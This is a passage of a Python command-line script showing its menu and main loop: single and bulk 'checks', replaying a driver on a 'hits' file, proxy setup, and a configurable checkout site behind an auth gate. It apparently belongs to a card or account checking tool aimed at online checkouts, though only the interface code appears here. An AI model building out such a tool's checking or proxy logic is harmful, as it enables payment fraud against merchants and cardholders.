                CFG.setdefault("address", {})[key] = val
                save_config(CFG)
                print("  " + GREEN + "saved" + R)
                time.sleep(0.4)
        except ValueError:
            pass

# =========================================================
#  MENU + MAIN
# =========================================================

def menu() -> str:
    print()
    site = CFG.get("checkout_site", "") or "—"
    driver = CFG.get("driver", "auto")
    boxed([
        f"  {WHITE}[1]{R}  Single check",
        f"  {WHITE}[2]{R}  Bulk check",
        f"  {WHITE}[3]{R}  Replay driver on hits file",
        f"  {WHITE}[4]{R}  Proxy configuration",
        f"  {WHITE}[5]{R}  Settings   {DIM}(site: {site}  driver: {driver}){R}",
        f"  {WHITE}[0]{R}  Exit",
    ], width=66)
    print()
    return input("  " + YELLOW + "select ▸ " + R).strip()

def main() -> None:
    if not auth_gate():
        return

    banner()
    type_out("  initializing...", delay=0.02, color=DIM)
    time.sleep(0.3)
    type_out("  ready.", delay=0.02, color=GREEN)

    while True:
        c = menu()
        if c == "1":
            banner()
            run_single()
        elif c == "2":
            banner()
            run_bulk()
            input("\n  " + DIM + "enter" + R)
        elif c == "3":
            banner()
            run_replay()
            input("\n  " + DIM + "enter" + R)
        elif c == "4":
            proxy_menu()
        elif c == "5":
            settings_menu()
        elif c in ("0", "q", "exit"):
            print()
            type_out("  goodbye...", delay=0.03, color=RED)
            return
        else:
            print("  " + RED + "invalid selection" + R)
            time.sleep(0.4)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        show_cursor()
        print("\n" + RED + "  goodbye..." + R)
